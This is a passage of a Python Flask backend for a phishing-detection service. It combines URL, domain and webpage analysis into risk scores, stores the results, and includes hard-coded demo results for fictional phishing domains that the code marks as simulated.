        fetch_result = {
            "target_url": url_input,
            "normalized_url": url_input,
            "final_url": url_input,
            "fetch_status": FETCH_SUCCESS,
            "fetch_status_detail": "200 OK (Captured Identity Discrepancy Payload)",
            "http_status": 200,
            "response_time_ms": 128,
            "content_type": "text/html; charset=utf-8",
            "content_length": len(demo_html),
            "server_header": "Microsoft-IIS/10.0",
            "html_content": demo_html,
            "response_headers": {"Content-Type": "text/html; charset=utf-8", "Server": "Microsoft-IIS/10.0"},
            "redirect_analysis": {"count": 0, "hops": [], "is_cross_domain": False},
            "ssrf_policy": {"status": "enforced", "blocked_private_ips": True},
            "engine_used": "PLAYWRIGHT_SANDBOX",
            "screenshot_url": "/static/screenshots/demo_microsoft_identity.png",
            "timestamp": datetime.now().isoformat(),
        }
        showcase_demo_meta = {
            "type": "identity_mismatch",
            "title": "⚖️ Demo 04: What The Page Claims vs What It Does",
            "tagline": "Looks legitimate on the surface. NeuraShield compares claimed identity with observed technical behavior.",
            "speaker_script": "Judges, notice this target: account-security-microsoft.demo/verify. On the surface, the page claims to be 'Microsoft Account Security Verification' with official-looking branding and security warnings. But NeuraShield does not judge a webpage only by what it says. When our engine observes what the page technically does, it catches password collection submitting cross-domain to an unauthorized third-party host — sync-telemetry-portal.xyz — and loading telemetry from cdn-metrics-tracker.xyz. Claimed identity and observed technical behavior are inconsistent!"
        }
    else:
        dynamic_requested = bool(data.get("dynamic_scan", False) or data.get("force_headless", False))
        fetch_result = safe_fetch_webpage_hybrid(url_input, force_headless=dynamic_requested)

    # ── Step 2: MODULE 2 — Domain Intelligence ──
    domain_intel = None
    domain_rules_result = None
    domain_ml_result = None

    if is_demo_aha:
        domain_intel = {
            "domain": "auth-portal-update.demo",
            "overall_status": "complete",
            "registration": {
                "collection_status": "complete",
                "registrar": "NameCheap, Inc.",
                "domain_age_days": 4,
                "is_recently_registered": True
            },
            "dns": {"collection_status": "resolved", "dns_resolution": True, "a_records": ["198.51.100.42"]},
            "ip": {"collection_status": "complete", "resolved_ipv4": ["198.51.100.42"], "infrastructure_provider": "Cloud Host Direct"},
            "ssl": {"collection_status": "complete", "ssl_available": True, "ssl_valid": True, "certificate_issuer": "Let's Encrypt Authority X3"}
        }
        domain_rules_result = {"count": 1, "risk_score": 35, "rules_hit": [{"rule_id": "DOM-001", "name": "Recently Registered Domain (Age: 4 days)"}], "evidence": []}
    elif is_demo_existence:
        domain_intel = None
        domain_rules_result = {"count": 0, "risk_score": 0, "rules_hit": [], "evidence": []}
    elif is_demo_campaign_a or is_demo_campaign_b:
        d_name = "support-login-apple.demo" if is_demo_campaign_a else "icloud-session-check.demo"
        domain_intel = {
            "domain": d_name,
            "overall_status": "complete",
            "registration": {
                "collection_status": "complete",
                "registrar": "Porkbun LLC",
                "domain_age_days": 2,
                "is_recently_registered": True
            },
            "dns": {"collection_status": "resolved", "dns_resolution": True, "a_records": ["104.21.55.89"]},
            "ip": {"collection_status": "complete", "resolved_ipv4": ["104.21.55.89"], "infrastructure_provider": "Cloudflare Edge"},
            "ssl": {"collection_status": "complete", "ssl_available": True, "ssl_valid": True, "certificate_issuer": "Google Trust Services LLC"}
        }
        domain_rules_result = {"count": 1, "risk_score": 40, "rules_hit": [{"rule_id": "DOM-001", "name": "Recently Registered Domain (Age: 2 days)"}], "evidence": []}
    elif is_demo_mismatch:
        domain_intel = {
            "domain": "account-security-microsoft.demo",
            "overall_status": "complete",
            "registration": {
                "collection_status": "complete",
                "registrar": "Porkbun LLC",
                "domain_age_days": 6,
                "is_recently_registered": True
            },
            "dns": {"collection_status": "resolved", "dns_resolution": True, "a_records": ["198.51.100.88"]},
            "ip": {"collection_status": "complete", "resolved_ipv4": ["198.51.100.88"], "infrastructure_provider": "Offshore Cloud Services"},
            "ssl": {"collection_status": "complete", "ssl_available": True, "ssl_valid": True, "certificate_issuer": "cPanel, Inc. Certification Authority"}
        }
        domain_rules_result = {"count": 1, "risk_score": 35, "rules_hit": [{"rule_id": "DOM-001", "name": "Recently Registered Domain (Age: 6 days)"}], "evidence": []}
    else:
        try:
            registered_domain = normalize_domain_input(url_input)
            if registered_domain:
                cached_domain = domain_cache.get(registered_domain)
                if cached_domain:
                    domain_intel = cached_domain.get('domain_intelligence')
                    domain_rules_result = cached_domain.get('domain_rules')
                    domain_ml_result = cached_domain.get('domain_ml')
                else:
                    domain_intel = analyze_domain(registered_domain)
                    domain_rules_result = evaluate_domain_rules(domain_intel)
                    d_feat = extract_domain_features(domain_intel)
                    if domain_model is not None:
                        try:
                            d_vec = features_to_vector(d_feat, domain_model_schema.get("features") if domain_model_schema else None)
                            d_pred = domain_model.predict(d_vec)[0]
                            d_prob = float(domain_model.predict_proba(d_vec)[0][1]) if hasattr(domain_model, "predict_proba") else (0.9 if d_pred == 1 else 0.1)
                            prob_disp = "<1%" if d_prob < 0.01 else (">99%" if d_prob > 0.99 else f"{round(d_prob * 100, 1)}%")
                            domain_ml_result = {
                                "status": "success",
                                "prediction": "Phishing" if d_pred == 1 else "Legitimate",
                                "probability": d_prob,
                                "probability_display": prob_disp,
                                "risk_score": int(round(d_prob * 100)),
                            }
                        except Exception as e:
                            domain_ml_result = {"status": "error", "error": str(e)}
                    domain_cache.put(registered_domain, {
                        'domain': registered_domain,
                        'domain_intelligence': domain_intel,
                        'domain_rules': domain_rules_result,
                        'domain_ml': domain_ml_result,
                    })
        except Exception as e:
            print(f"Domain analysis in webpage endpoint: {e}")

    # ── Step 3: MODULE 3 — Webpage Intelligence ──
    webpage_analysis = analyze_webpage(fetch_result)
    webpage_rules_result = evaluate_webpage_rules(webpage_analysis, fetch_result, url_input)
    identity_consistency = evaluate_identity_consistency(webpage_analysis, fetch_result, url_input)
    webpage_analysis['identity_consistency'] = identity_consistency

    # Calculate webpage-specific risk metrics
    is_available = (fetch_result.get('fetch_status') == FETCH_SUCCESS and bool(webpage_analysis.get('html_analysis')))
    webpage_status = "AVAILABLE" if is_available else "UNAVAILABLE"
    wp_reason = fetch_result.get('fetch_status') or "NETWORK_ERROR"

    wp_risk_score = webpage_rules_result.get('risk_score', 0) if is_available else 0
    form_data = webpage_analysis.get('form_analysis') or {}
    script_data = webpage_analysis.get('script_analysis') or {}
    header_data = webpage_analysis.get('header_analysis') or {}
    html_data = webpage_analysis.get('html_analysis') or {}
    resource_data = webpage_analysis.get('resource_analysis') or {}

    # Evidence coverage for webpage layer
    if is_available:
        coverage_factors = [1.0]
        if form_data.get('status') == 'analyzed': coverage_factors.append(1.0)
        else: coverage_factors.append(0.0)
        if script_data.get('status') == 'analyzed': coverage_factors.append(1.0)
        else: coverage_factors.append(0.0)
        if header_data.get('status') == 'analyzed': coverage_factors.append(1.0)
        else: coverage_factors.append(0.5)
        wp_evidence_coverage = round(sum(coverage_factors) / len(coverage_factors) * 100)
        wp_confidence = round(wp_evidence_coverage * 0.85 / 100, 2)
        if webpage_rules_result.get('count', 0) > 2:
            wp_confidence = min(0.95, wp_confidence + 0.1)
        evidence_coverage_label = "Complete"
    else:
        # Crucial: Reduced evidence coverage, zero fabricated confidence
        wp_evidence_coverage = 0
        wp_confidence = 0.0
        evidence_coverage_label = "Reduced"

    # ── Build combined intelligence ──
    intelligence = build_url_intelligence(
        url_input, prediction, probability, features,
        domain_intel, domain_rules_result, domain_ml_result
    )

    # Inject webpage data into intelligence
    intelligence['webpage_intelligence'] = webpage_analysis
    intelligence['webpage_rules'] = webpage_rules_result
    intelligence['identity_consistency'] = identity_consistency
    intelligence['webpage_fetch'] = {
        'fetch_status': fetch_result.get('fetch_status'),
        'fetch_status_detail': fetch_result.get('fetch_status_detail'),
        'http_status': fetch_result.get('http_status'),
        'final_url': fetch_result.get('final_url'),
        'response_time_ms': fetch_result.get('response_time_ms'),
        'content_type': fetch_result.get('content_type'),
        'content_length': fetch_result.get('content_length'),
        'server_header': fetch_result.get('server_header'),
        'redirect_analysis': fetch_result.get('redirect_analysis'),
        'ssrf_policy': fetch_result.get('ssrf_policy'),
        'webpage_status': webpage_status,
        'reason': wp_reason,
        'engine_used': fetch_result.get('engine_used', 'STATIC_CRAWLER'),
        'screenshot_url': fetch_result.get('screenshot_url'),
    }

    # Merge webpage evidence into combined evidence ONLY if webpage was available
    combined_evidence = list(intelligence.get('evidence', []))
    if is_available:
        combined_evidence.extend(webpage_rules_result.get('evidence', []))
    intelligence['evidence'] = combined_evidence

    combined_signals = list(intelligence.get('top_signals', []))
    if is_available:
        combined_signals.extend(webpage_rules_result.get('top_signals', []))
    intelligence['top_signals'] = combined_signals

    # Recalculate composite with webpage layer
    fusion = fuse_threat_layers(
        intelligence, domain_intel, domain_rules_result, domain_ml_result, webpage_rules_result
    )
    intelligence['composite_risk'] = fusion['composite']
    intelligence['composite_level'] = fusion['composite_level']

    # Update limitations
    intelligence['limitations'] = [
        l for l in intelligence.get('limitations', [])
        if 'Module 3' not in l and 'Webpage' not in l
    ]
    if not is_available:
        intelligence['limitations'].append(
            f"Webpage Intelligence: UNAVAILABLE (Reason: {wp_reason}). Webpage could not be retrieved, so webpage-level analysis was not performed. Evidence coverage is Reduced. (A domain existing does NOT mean a webpage exists)."
        )
    else:
        intelligence['limitations'].append(
            "JavaScript was inspected statically and not executed. Dynamic behavior may differ."
        )

    # Build full investigation
    investigation = build_full_investigation(
        url_input, intelligence, features, prediction, probability
    )
    investigation['identity_consistency'] = identity_consistency
    if showcase_demo_meta and showcase_demo_meta.get('threat_dna'):
        investigation['threat_dna'] = showcase_demo_meta['threat_dna']
    inv_id = investigation['investigation_id']
    investigation_store.put(inv_id, investigation)

    # Generate webpage-specific recommendations
    if not is_available:
        wp_level = 'UNAVAILABLE'
        wp_recommendation = (
            f"Webpage could not be retrieved ({wp_reason}: {fetch_result.get('fetch_status_detail', '')}). "
            f"Webpage-level analysis was not performed, and webpage unavailability was NOT converted into a phishing verdict."
        )
        what_found = ["Webpage could not be retrieved, so webpage-level analysis was not performed."]
        what_not_verified = [
            f"Webpage content could not be retrieved ({wp_reason}).",
            "A domain existing does NOT mean a webpage exists. Domain infrastructure may resolve while HTTP/HTTPS service is offline.",
            "JavaScript and DOM security posture could not be evaluated."
        ]
    else:
        wp_level = calculate_risk_level(wp_risk_score)
        if wp_level == 'CRITICAL' or wp_level == 'HIGH':
            wp_recommendation = "Avoid entering passwords, OTPs, payment information, or downloading files from this webpage."
        elif wp_level == 'MEDIUM':
            wp_recommendation = "Verify the site's identity before entering sensitive information."
        else:
            wp_recommendation = "The investigation did not identify strong webpage-based threat indicators. Continue normal security precautions."

        what_found = []
        if form_data.get('has_password_field'):
            what_found.append('The webpage contains a password collection form.')
        if form_data.get('has_cross_domain_action'):
            what_found.append('A form submits data to a different registered domain.')
        redirect_count = (fetch_result.get('redirect_analysis') or {}).get('count', 0)
        if redirect_count > 0:
            what_found.append(f'{redirect_count} redirect(s) were observed.')
        ext_domains = resource_data.get('external_domain_count', 0)
        if ext_domains > 0:
            what_found.append(f'The page loads resources from {ext_domains} external domain(s).')
        if header_data.get('coverage_percent', 0) < 50:
            what_found.append(f'Security header coverage is {header_data.get("coverage_percent", 0)}% ({header_data.get("present_count", 0)}/{header_data.get("total_expected", 6)}).')
        if script_data.get('has_suspicious_patterns'):
            what_found.append('Potentially suspicious JavaScript patterns were detected.')
        if not what_found:
            what_found.append('No significant webpage-level risk indicators were identified.')

        what_not_verified = [
            'JavaScript was inspected statically and not executed.',
        ]
        if domain_intel is None or domain_intel.get('overall_status') == 'failed':
            what_not_verified.append('Domain infrastructure data was unavailable.')

    # Persist to database
    try:
        conn = get_db_connection()
        cursor = conn.cursor()
        cursor.execute("""
            INSERT INTO webpage_analyses (
                investigation_id, target_url, normalized_url, final_url,
                fetch_status, http_status, redirect_count, analysis_timestamp,
                risk_score, risk_level, confidence, evidence_coverage,
                redirect_data, form_data, script_data, iframe_data,
                resource_data, header_data, rule_results, webpage_risk_score, html_metadata
            ) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
        """, (
            inv_id, url_input, fetch_result.get('normalized_url'),
            fetch_result.get('final_url'), fetch_result.get('fetch_status'),
            fetch_result.get('http_status'), (fetch_result.get('redirect_analysis') or {}).get('count', 0),
            datetime.now().isoformat(),
            fusion['composite'], fusion['composite_level'],
            wp_confidence, wp_evidence_coverage,
            json.dumps(fetch_result.get('redirect_analysis', {})),
            json.dumps(form_data),
            json.dumps(script_data),
            json.dumps(webpage_analysis.get('iframe_analysis', {})),
            json.dumps(resource_data),
            json.dumps(header_data),
            json.dumps(webpage_rules_result),
            wp_risk_score,
            json.dumps(html_data),
        ))
        conn.commit()
        conn.close()
    except Exception as e:
        print(f"Error persisting webpage analysis to DB: {e}")

    response_payload = sanitize_for_json({
        'investigation_id': inv_id,
        'investigation': investigation,
        'target_url': url_input,
        'final_url': fetch_result.get('final_url'),
        'webpage_status': webpage_status,
        'webpage_available': is_available,
        'webpage_reason': wp_reason,
        'webpage_message': "Webpage could not be retrieved, so webpage-level analysis was not performed." if not is_available else "Webpage content successfully retrieved and analyzed.",
        'evidence_coverage_label': evidence_coverage_label,
        'fetch_status': fetch_result.get('fetch_status'),
        'fetch_status_detail': fetch_result.get('fetch_status_detail'),
        'http_status': fetch_result.get('http_status'),
        'response_time_ms': fetch_result.get('response_time_ms'),
        'redirect_analysis': fetch_result.get('redirect_analysis'),
        'webpage_analysis': webpage_analysis,
        'webpage_rules': webpage_rules_result,
        'identity_consistency': identity_consistency,
        'security_headers': header_data if is_available else None,
        'risk_score': fusion['composite'],
        'risk_level': fusion['composite_level'],
        'webpage_risk_score': wp_risk_score if is_available else None,
        'webpage_risk_level': wp_level,
        'confidence': wp_confidence,
        'evidence_coverage': wp_evidence_coverage,
        'risk_fusion': fusion,
        'what_found': what_found,
        'what_not_verified': what_not_verified,
        'recommendation': wp_recommendation,
        'threat_dna': investigation.get('threat_dna'),
        'showcase_demo': showcase_demo_meta,
        'simulated': bool(showcase_demo_meta),
        'simulated_notice': ("SIMULATED DEMO RESULT — hard-coded presentation content, not a real analysis." if showcase_demo_meta else None),
        'engine_used': fetch_result.get('engine_used', 'STATIC_CRAWLER'),
        'screenshot_url': fetch_result.get('screenshot_url'),
    })

    return jsonify(response_payload)

@app.route("/api/domain/analyze", methods=["POST"])
def api_domain_analyze():
    """Real-time domain intelligence analysis endpoint."""
    data = request.get_json(silent=True) or {}
    domain_input = (data.get("domain") or request.form.get("domain") or "").strip()
    if not domain_input:
        return jsonify({"error": "No domain provided"}), 400

    domain_norm = normalize_domain_input(domain_input)
    if isinstance(domain_norm, dict):
        registered_domain = domain_norm.get("registered_domain") or domain_norm.get("hostname")
    else:
        registered_domain = domain_norm
    if not registered_domain:
        return jsonify({"error": "Invalid domain format", "domain": domain_input}), 400

    if not is_safe_target(registered_domain):
        return jsonify({"error": "Target blocked by security policy (SSRF protection)", "domain": registered_domain}), 403

    cached = domain_cache.get(registered_domain)
    if cached and not data.get("refresh", False):
        return jsonify(sanitize_for_json(cached))

    try:
        intel = analyze_domain(registered_domain)
        if "error" in intel and "Target blocked by security policy" in intel.get("error", ""):
            return jsonify({"error": "Target blocked by security policy (SSRF protection)", "domain": registered_domain}), 403
    except Exception as e:
        return jsonify({"error": f"Collection error: {str(e)}", "domain": registered_domain}), 500

    rules_result = evaluate_domain_rules(intel)
    features = extract_domain_features(intel)

    ml_result = {
        "status": "unavailable",
        "prediction": "Unknown",
        "probability": None,
        "probability_display": "Unavailable",
        "risk_score": None,
        "calibration_status": "Calibrated via 5-fold cross-validation (LogisticRegression L2)",
    }
    if domain_model is not None:
        try:
            vec = features_to_vector(features, domain_model_schema.get("features") if domain_model_schema else None)
            pred = domain_model.predict(vec)[0]
            prob = float(domain_model.predict_proba(vec)[0][1]) if hasattr(domain_model, "predict_proba") else (0.9 if pred == 1 else 0.1)
            
            if prob < 0.01:
                prob_disp = "<1%"
            elif prob > 0.99:
                prob_disp = ">99%"
            else:
                prob_disp = f"{round(prob * 100, 1)}%"

            ml_result = {
                "status": "success",
                "prediction": "Phishing" if pred == 1 else "Legitimate",
                "probability": prob,
                "probability_display": prob_disp,
                "risk_score": int(round(prob * 100)),
                "calibration_status": "Calibrated via 5-fold cross-validation (LogisticRegression L2)",
            }
        except Exception as e:
            ml_result["error"] = str(e)

    r_score = rules_result.get("risk_score", 0)
    if ml_result.get("status") == "success":
        combined_score = int(round(0.50 * r_score + 0.50 * ml_result["risk_score"]))
    else:
        combined_score = r_score
    combined_score = max(0, min(100, combined_score))
    risk_level = calculate_risk_level(combined_score)

    coverage = intel.get("evidence_coverage", 0.0)
    prob_val = ml_result.get("probability")
    if prob_val is not None:
        margin = abs(prob_val - 0.5) * 2.0
        confidence = round((coverage / 100.0) * (0.60 + 0.40 * margin), 2)
    else:
        confidence = round((coverage / 100.0) * 0.50, 2)

    risk_factors = list(rules_result.get("risk_factors", []))
    if ml_result.get("status") == "success":
        risk_factors.append(f"ML Model: {ml_result['prediction']} ({ml_result['probability_display']} phishing probability)")

    # Auditable feature list with source and status
    feature_source_map = {
        'dns_resolution': ('DNS', intel.get('dns', {}).get('collection_status', 'unavailable')),
        'a_record_count': ('DNS', intel.get('dns', {}).get('collection_status', 'unavailable')),
        'aaaa_record_count': ('DNS', intel.get('dns', {}).get('collection_status', 'unavailable')),
        'mx_record_count': ('DNS', intel.get('dns', {}).get('collection_status', 'unavailable')),
        'ns_record_count': ('DNS', intel.get('dns', {}).get('collection_status', 'unavailable')),
        'txt_record_count': ('DNS', intel.get('dns', {}).get('collection_status', 'unavailable')),
        'has_mx': ('DNS', intel.get('dns', {}).get('collection_status', 'unavailable')),
        'dns_collection_success': ('DNS', intel.get('dns', {}).get('collection_status', 'unavailable')),
        'ip_count': ('IP/Infra', intel.get('ip', {}).get('collection_status', 'unavailable')),
        'has_multiple_ips': ('IP/Infra', intel.get('ip', {}).get('collection_status', 'unavailable')),
        'domain_age_days': ('Registration', intel.get('registration', {}).get('collection_status', 'unavailable')),
        'domain_remaining_days': ('Registration', intel.get('registration', {}).get('collection_status', 'unavailable')),
        'registrar_present': ('Registration', intel.get('registration', {}).get('collection_status', 'unavailable')),
        'expiration_available': ('Registration', intel.get('registration', {}).get('collection_status', 'unavailable')),
        'whois_collection_success': ('Registration', intel.get('registration', {}).get('collection_status', 'unavailable')),
        'nameserver_count': ('Nameservers', intel.get('nameservers', {}).get('collection_status', 'unavailable')),
        'nameserver_diversity': ('Nameservers', intel.get('nameservers', {}).get('collection_status', 'unavailable')),
        'ssl_available': ('SSL/TLS', intel.get('ssl', {}).get('collection_status', 'unavailable')),
        'ssl_valid': ('SSL/TLS', intel.get('ssl', {}).get('collection_status', 'unavailable')),
        'certificate_age_days': ('SSL/TLS', intel.get('ssl', {}).get('collection_status', 'unavailable')),
        'certificate_remaining_days': ('SSL/TLS', intel.get('ssl', {}).get('collection_status', 'unavailable')),
        'certificate_san_count': ('SSL/TLS', intel.get('ssl', {}).get('collection_status', 'unavailable')),
        'certificate_hostname_match': ('SSL/TLS', intel.get('ssl', {}).get('collection_status', 'unavailable')),
        'certificate_is_wildcard': ('SSL/TLS', intel.get('ssl', {}).get('collection_status', 'unavailable')),
        'ssl_collection_success': ('SSL/TLS', intel.get('ssl', {}).get('collection_status', 'unavailable')),
        'tld_length': ('Domain Syntax', 'success'),
        'domain_name_length': ('Domain Syntax', 'success'),
        'domain_name_entropy': ('Domain Syntax', 'success'),
        'domain_has_digits': ('Domain Syntax', 'success'),
        'domain_digit_ratio': ('Domain Syntax', 'success'),
        'domain_hyphen_count': ('Domain Syntax', 'success'),
        'evidence_coverage': ('Telemetry', 'success'),
    }
    features_auditable = []
    for k, v in features.items():
        if k == 'domain': continue
        src, status = feature_source_map.get(k, ('Telemetry', 'unknown'))
        val_disp = v if (v is not None and not pd.isna(v)) else 'Not observed / Unavailable'
        features_auditable.append({
            'feature_name': k,
            'value': val_disp,
            'source': src,
            'collection_status': status,
        })

    # Construct Full Threat Investigation dossier for Domain Intelligence
    target_url = f"https://{registered_domain}"
    url_pred = "Phishing" if combined_score >= 60 else ("Suspicious" if combined_score >= 40 else "Legitimate")
    url_prob = ml_result.get("probability", 0.0)
    url_prob_pct = round(url_prob * 100, 1) if url_prob is not None else combined_score
    url_features = extract_features(target_url)

    intelligence = build_url_intelligence(
        target_url,
        url_pred,
        url_prob_pct,
        url_features,
        intel,
        rules_result,
        ml_result
    )
    intelligence['composite_risk'] = combined_score
    intelligence['composite_level'] = risk_level

    investigation = build_full_investigation(
        target_url,
        intelligence,
        url_features,
        url_pred,
        url_prob_pct
    )
    inv_id = investigation['investigation_id']
    threat_dna = investigation['threat_dna']
    investigation['domain'] = registered_domain
    investigation_store.put(inv_id, investigation)

    response_data = {
        "domain": registered_domain,
        "input": domain_input,
        "investigation_id": inv_id,
        "threat_dna": threat_dna,
        "investigation": investigation,
        "normalization": intel.get("normalization", {}),
        "risk_score": combined_score,
        "risk_level": risk_level,
        "confidence": confidence,
        "risk_factors": risk_factors,
        "domain_intelligence": intel,
        "domain_rules": rules_result,
        "domain_ml": ml_result,
        "features": {k: (None if (v is None or pd.isna(v)) else v) for k, v in features.items()},
        "features_auditable": features_auditable,
        "coverage": coverage,
        "telemetry_categories": intel.get("telemetry_categories", []),
        "ssrf_policy": intel.get("ssrf_policy", {}),
    }

    sanitized_response = sanitize_for_json(response_data)
    domain_cache.put(registered_domain, sanitized_response)

    try:
        conn = get_db_connection()
        cursor = conn.cursor()
        cursor.execute("""
            INSERT INTO domain_analyses (
                domain, analysis_timestamp, risk_score, risk_level, confidence,
                evidence_coverage, dns_data, ip_data, registration_data, nameserver_data,
                ssl_data, reputation_data, model_result, rules_result, collection_status, raw_features
            ) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
        """, (
            registered_domain,
            intel.get("analysis_timestamp", datetime.now().isoformat()),
            combined_score,
            risk_level,
            confidence,
            coverage,
            json.dumps(intel.get("dns", {})),
            json.dumps(intel.get("ip", {})),
            json.dumps(intel.get("registration", {})),
            json.dumps(intel.get("nameservers", {})),
            json.dumps(intel.get("ssl", {})),
            json.dumps(intel.get("reputation", {})),
            json.dumps(ml_result),
            json.dumps(rules_result),
            intel.get("overall_status", "unknown"),
            json.dumps(sanitized_response["features"]),
        ))
        conn.commit()
        conn.close()
    except Exception as e:
        print(f"Error persisting domain analysis to DB: {e}")

    return jsonify(sanitized_response)


# ── SCAN API (Single URL) ─────────────────────────────────────────────────────

@app.route("/api/scan", methods=["POST"])
@app.route("/api/demo-scan", methods=["POST"])
def api_scan():
    """Unified scan endpoint — returns full MODULE 1 & MODULE 2 intelligence payload."""
    data = request.get_json(silent=True) or {}
    url  = data.get('url', '') or request.form.get('url', '')
    if not url:
        return jsonify({'error': 'No URL provided'}), 400

    prediction, probability = classify_url(url)
    features = extract_features(url)

    # ── MODULE 2: Domain Intelligence telemetry ──
    domain_intel = None
    domain_rules = None
    domain_ml = None
    try:
        registered_domain = normalize_domain_input(url)
        if registered_domain:
            cached_domain = domain_cache.get(registered_domain)
            if cached_domain:
                domain_intel = cached_domain.get('domain_intelligence')
                domain_rules = cached_domain.get('domain_rules')
                domain_ml = cached_domain.get('domain_ml')
            else:
                domain_intel = analyze_domain(registered_domain)
                domain_rules = evaluate_domain_rules(domain_intel)
                d_feat = extract_domain_features(domain_intel)
                if domain_model is not None:
                    try:
                        d_vec = features_to_vector(d_feat, domain_model_schema.get("features") if domain_model_schema else None)
                        d_pred = domain_model.predict(d_vec)[0]
                        d_prob = float(domain_model.predict_proba(d_vec)[0][1]) if hasattr(domain_model, "predict_proba") else (0.9 if d_pred == 1 else 0.1)
                        if d_prob < 0.01:
                            prob_disp = "<1%"
                        elif d_prob > 0.99:
                            prob_disp = ">99%"
                        else:
                            prob_disp = f"{round(d_prob * 100, 1)}%"
                        domain_ml = {
                            "status": "success",
                            "prediction": "Phishing" if d_pred == 1 else "Legitimate",
                            "probability": d_prob,
                            "probability_display": prob_disp,
                            "risk_score": int(round(d_prob * 100)),
                            "calibration_status": "Calibrated via 5-fold cross-validation (LogisticRegression L2)",
                        }
                    except Exception as e:
                        domain_ml = {"status": "error", "error": str(e)}
                domain_cache.put(registered_domain, {
                    'domain': registered_domain,
                    'domain_intelligence': domain_intel,
                    'domain_rules': domain_rules,
                    'domain_ml': domain_ml,
                })
    except Exception as e:
        print(f"Domain analysis exception in scan: {e}")

    # Build intelligence with Module 1 and Module 2
    intelligence = build_url_intelligence(url, prediction, probability, features, domain_intel, domain_rules, domain_ml)

    # Build full investigation package
    investigation = build_full_investigation(url, intelligence, features, prediction, probability)

    user_id   = session.get("user_id")
    stats     = None
    recent_logs = []

    if user_id:
        try:
            conn   = get_db_connection()
            cursor = conn.cursor()
            cursor.execute(
                "INSERT INTO logs (user_id, url, prediction, timestamp, risk_level, risk_score, domain_risk_score, domain_risk_level) VALUES (?, ?, ?, ?, ?, ?, ?, ?)",
                (
                    user_id, url, prediction, datetime.now(),
                    intelligence.get('composite_level', 'LOW'),
                    intelligence.get('composite_risk', 0),
                    domain_rules.get('risk_score', 0) if domain_rules else None,
                    calculate_risk_level(domain_rules.get('risk_score', 0)) if domain_rules else None,
                )
            )
            conn.commit()
            cursor.execute("SELECT COUNT(*) FROM logs WHERE user_id=?", (user_id,))
            total = cursor.fetchone()[0]
            cursor.execute("SELECT COUNT(*) FROM logs WHERE user_id=? AND prediction LIKE '%Phishing%'", (user_id,))
            phish = cursor.fetchone()[0]
            cursor.execute("SELECT COUNT(*) FROM logs WHERE user_id=? AND prediction='Legitimate'", (user_id,))
            legit = cursor.fetchone()[0]
            stats = {'total': total, 'phishing': phish, 'legitimate': legit}
            cursor.execute(
                "SELECT url, prediction, timestamp FROM logs WHERE user_id=? ORDER BY id DESC LIMIT 5",
                (user_id,)
            )
            rows = cursor.fetchall()
            recent_logs = [{'url': r[0], 'prediction': r[1], 'timestamp': str(r[2]).split('.')[0]} for r in rows]
            conn.close()
        except Exception as e:
            print(f"Error logging scan: {e}")

    return jsonify(sanitize_for_json({
        'url':                 url,
        'prediction':          prediction,
        'probability':         float(probability) if probability is not None else None,
        'features':            {k: v for k, v in features.items() if isinstance(v, (int, float, str))},
        'intelligence':        intelligence,
        'domain_intelligence': domain_intel,
        'domain_rules':        domain_rules,
        'domain_ml':           domain_ml,
        'target':              intelligence.get('target', {}),
        'url_intelligence':    intelligence.get('url_intelligence', {}),
        'metadata':            intelligence.get('metadata', {}),
        'limitations':         intelligence.get('limitations', []),
        'stats':               stats,
        'recent_logs':         recent_logs,
        'investigation_id':    investigation['investigation_id'],
        'investigation':       investigation,
    }))

@app.route("/api/investigation/<inv_id>", methods=["GET"])
def api_investigation(inv_id):
    """Retrieve an in-memory full investigation by ID, or regenerate on-the-fly if URL or domain is provided.
    Works before login and after login so report links never fail.
    """
    inv = investigation_store.get(inv_id)
    if not inv and _email_hooks:
        try:
            inv, _ = _email_hooks["load_investigation"](inv_id)
        except Exception:
            inv = None
    if not inv:
        conn = get_db_connection()
        try:
            row = conn.execute("SELECT payload_json, target_display FROM investigations WHERE investigation_id=?", (inv_id,)).fetchone()
            if row and row[0]:
                inv = json.loads(row[0])
            elif row and row[1]:
                request.args = request.args.copy() if hasattr(request.args, 'copy') else {}
                request.args['url'] = row[1]
        except Exception:
            pass
        finally:
            conn.close()

    # If we already have the investigation payload, return it immediately (publicly readable for analysts and guests)
    if inv:
        return jsonify(sanitize_for_json(inv))

    # Fallback: Regenerate investigation on-the-fly if url/domain provided or look for fallback demo target
    url = request.args.get("url", "").strip()
    domain = request.args.get("domain", "").strip()
    if domain and not url:
        url = f"https://{domain}"

    # If still no URL, check the most recent scan from logs or use clean demo URL
    if not url:
        try:
            conn = get_db_connection()
            row = conn.execute("SELECT url FROM logs ORDER BY id DESC LIMIT 1").fetchone()
            if row and row[0]:
                url = row[0]
            conn.close()
        except Exception:
            pass
    if not url:
        url = "https://auth-portal-update.demo/login"

    try:
        prediction, probability = classify_url(url)
        features = extract_features(url)
        domain_intel = None
        domain_rules = None
        domain_ml = None
        try:
            registered_domain = normalize_domain_input(url)
            if registered_domain:
                cached_domain = domain_cache.get(registered_domain)
                if cached_domain:
                    domain_intel = cached_domain.get('domain_intelligence')
                    domain_rules = cached_domain.get('domain_rules')
                    domain_ml = cached_domain.get('domain_ml')
                else:
                    domain_intel = analyze_domain(registered_domain)
                    domain_rules = evaluate_domain_rules(domain_intel)
                    d_feat = extract_domain_features(domain_intel)
                    if domain_model is not None:
                        try:
                            d_vec = features_to_vector(d_feat, domain_model_schema.get("features") if domain_model_schema else None)
                            d_pred = domain_model.predict(d_vec)[0]
                            d_prob = float(domain_model.predict_proba(d_vec)[0][1]) if hasattr(domain_model, "predict_proba") else (0.9 if d_pred == 1 else 0.1)
                            prob_disp = "<1%" if d_prob < 0.01 else (">99%" if d_prob > 0.99 else f"{round(d_prob * 100, 1)}%")
                            domain_ml = {
                                "status": "success",
                                "prediction": "Phishing" if d_pred == 1 else "Legitimate",
                                "probability": d_prob,
                                "probability_display": prob_disp,
                                "risk_score": int(round(d_prob * 100)),
                                "calibration_status": "Calibrated via 5-fold cross-validation (LogisticRegression L2)",
                            }
                        except Exception as e:
                            domain_ml = {"status": "error", "error": str(e)}
                    domain_cache.put(registered_domain, {
                        'domain': registered_domain,
                        'domain_intelligence': domain_intel,
                        'domain_rules': domain_rules,
                        'domain_ml': domain_ml,
                    })
        except Exception as de:
            print(f"Domain intel generation error: {de}")
        intelligence = build_url_intelligence(url, prediction, probability, features, domain_intel, domain_rules, domain_ml)
        inv = build_full_investigation(url, intelligence, features, prediction, probability)
        if inv_id and inv_id != 'adhoc':
            inv['investigation_id'] = inv_id
